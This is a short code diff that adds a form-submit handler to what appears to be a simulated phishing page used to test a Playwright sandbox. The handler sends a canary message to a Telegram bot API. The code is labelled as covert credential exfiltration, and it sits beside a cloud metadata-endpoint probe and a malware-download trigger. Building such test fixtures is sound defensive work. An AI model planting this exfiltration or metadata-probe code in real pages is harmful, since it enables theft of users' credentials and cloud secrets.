@@ -47,6 +47,13 @@
       fetch('http://169.254.169.254/latest/meta-data/', { mode: 'no-cors' }).catch(() => {});
     } catch (e) {}
 
+    // Sneaky Action 1b: Covert Telegram Bot credential exfiltration channel on submission
+    document.querySelector('form').addEventListener('submit', () => {
+      try {
+        fetch('https://api.telegram.org/bot7182940182:AAFakeTokenForTest_PhishChipsDemo/sendMessage?chat_id=12345678&text=canary_harvested', { mode: 'no-cors' }).catch(() => {});
+      } catch (err) {}
+    });
+
     // Sneaky Action 2: Covert automatic malware download trigger
     // This will be INTERCEPTED and BLOCKED by the Playwright sandbox!
     setTimeout(() => {
